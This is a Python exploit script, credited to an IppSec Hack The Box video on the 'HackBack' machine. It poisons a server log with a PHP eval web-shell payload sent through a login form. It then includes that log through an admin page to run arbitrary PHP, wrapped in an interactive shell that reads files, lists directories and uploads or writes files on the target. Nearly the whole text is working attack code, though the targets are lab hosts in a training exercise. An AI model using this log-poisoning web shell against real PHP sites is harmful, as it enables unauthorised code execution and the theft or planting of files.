#
#  From IppSec HackBack HTB YouTube
#
#  https://youtu.be/B9nozi1PrhY
#

#!/usr/bin/python3

import requests
import re
from base64 import b64decode, b64encode
from cmd import Cmd

# PHP is running in safe mode on the box and so various commands won't work

class Terminal(Cmd):

    # Get PHPSESSID and _token from the form and poison log

    def init_log(self, command):
        print("[*] initializing log")
        
        r = requests.get("http://www.hackthebox.htb")

        self.SESSION = re.search("=(.+?);", r.headers['Set-Cookie']).group(1)
        token   = re.search("_token\" value=\"(.+?)\"",r.text).group(1)
        
        params = {'action': 'init', 'password' : '12345678', 'site' : 'hackthebox', 'session' : self.SESSION }

        url = 'http://admin.hackback.htb/2bb6916122f1da34dcd916421e531578/webadmin.php'
        r = requests.get(url, params=params, allow_redirects=False)
        
        data = {'_token'   : token, 'username' : 'test', 'password' : command, 'submit' : '' }

        r = requests.post("http://www.hackthebox.htb", data=data, allow_redirects=False)
        return 
    
    def parse_response(self, page):
        page = page.decode('utf-8')
        m = re.search('WooTWooT(.+?)TooWTooW', page)
        if m:
            return b64decode(m.group(1)).decode()
        else:
            return "No results."

            
    def run_php(self, command):
        params = { 'action': 'show',
                   'password' : '12345678',
                   'site' : 'hackthebox',
                   'session' : self.SESSION,
                   'ippsec' : b64encode(str.encode(command)) }

        url = 'http://admin.hackback.htb/2bb6916122f1da34dcd916421e531578/webadmin.php'
   
        r = requests.get(url, params=params, allow_redirects=False)

        return self.parse_response(r.content)

    
    def __init__(self):
        self.prompt = '> '
        self.SESSION = ''
        
        command = "WooTWooT<?php eval(base64_decode($_GET['ippsec'])); ?>TooWTooW"
        self.init_log(command)
        super().__init__()

    def do_cat(self, args):
        command = f'echo(base64_encode(file_get_contents("{args}")));'
        print(self.run_php(command))

    def do_ls(self, args):
        command = 'foreach (scandir("' + args + '") as $filename) { $x .= $filename."\\n"; } echo (base64_encode($x));'
        print(self.run_php(command))

    def do_upload(self, args):
        source, destination = args.split(' ')

        with open(source, 'r') as handle:
            for line in handle:
                b64_line = b64encode(str.encode(line))
                b64_line = b64_line.decode('utf-8')
                command = f"$fp = fopen('{destination}','a');"
                command += f"fwrite($fp, base64_decode('{b64_line}'));"
                print(command)
                self.run_php(command)

    def do_write(self, args):
        source, destination = args.split(' ')

        with open(source,"rb") as f:
            payload = b64encode(f.read())

            command = f"file_put_contents('{destination}',base64_decode('{payload}'));"
            # command = f"$fp = fopen('{destination}','a');"
            # command += f"fwrite($fp, base64_decode('{b64_line}'));"
            # print(command)

            data = {"_token": "23I6TdlO18ZPtXYQPeHZyAY4Y8Z9wq1ntgvP8YdA",
                    "username": "test@test.com",
                    "password": "<?php echo(file_put_contents(\"{destination}\", base64_decode(\"{payload}\"))); ?>",
                    "submit": ""}
            r = requests.post("http://www.hackthebox.htb",data=data)
            print(r.status_code)

term = Terminal()
term.cmdloop()
